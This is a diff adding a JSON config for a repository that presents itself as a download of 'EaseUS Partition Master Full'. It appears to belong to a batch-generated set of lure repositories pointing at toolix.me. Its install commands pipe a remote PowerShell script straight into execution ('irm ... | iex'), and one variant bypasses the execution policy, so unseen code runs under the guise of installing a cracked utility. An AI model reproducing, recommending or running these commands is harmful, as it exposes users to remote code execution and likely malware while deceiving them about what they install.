@@ -1,0 +1,27 @@
+{
+  "repo": "easeus-partition-master-full",
+  "product": "EaseUS Partition Master Full",
+  "product_title": "easeus",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-part1",
+  "format": "license-md-toolix-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "utility",
+  "topics": [
+    "easeus-partition-master",
+    "easeus-partition",
+    "disk-partition",
+    "partition-manager",
+    "mbr-gpt",
+    "disk-clone",
+    "how-to-install-easeus-partition",
+    "how-to-setup-easeus-partition",
+    "desktop-package",
+    "windows-11",
+    "windows-10"
+  ],
+  "site": "toolix.me"
+}
